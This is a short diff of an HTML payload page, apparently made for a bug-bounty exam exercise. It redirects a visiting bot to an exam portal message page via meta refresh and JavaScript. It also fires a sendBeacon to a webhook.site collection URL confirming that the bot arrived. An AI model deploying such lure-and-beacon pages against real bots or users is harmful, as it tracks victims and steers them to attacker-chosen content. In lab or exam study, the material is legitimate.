@@ -1,17 +1,14 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/view.php?id=69e2a884bee6d6b7c662a00f">
+</head>
 <body>
     <script>
-        // 1. USE YOUR NEW WEBHOOK ID HERE
-        const webhookUrl = "https://webhook.site/25f05aa1-8e17-4fef-a97f-3bb992e8bc01";
-        // 2. USE YOUR LATEST MESSAGE ID HERE
-        const targetId = "69e2a884bee6d6b7c662a00f"; 
-
-        // Send a signal so we know the bot at least reached GitHub
-        navigator.sendBeacon(webhookUrl + "/?status=bot_on_github");
-
-        // Force the redirect
-        window.location.href = "https://bugbounty-exam.hashacademy.co/view.php?id=" + targetId;
+        // This is a backup signal to your webhook
+        const webhook = "https://webhook.site/25f05aa1-8e17-4fef-a97f-3bb992e8bc01";
+        navigator.sendBeacon(webhook + "/?bot_is_on_github=true");
     </script>
+    <h1>Redirecting to Exam Portal...</h1>
 </body>
 </html>
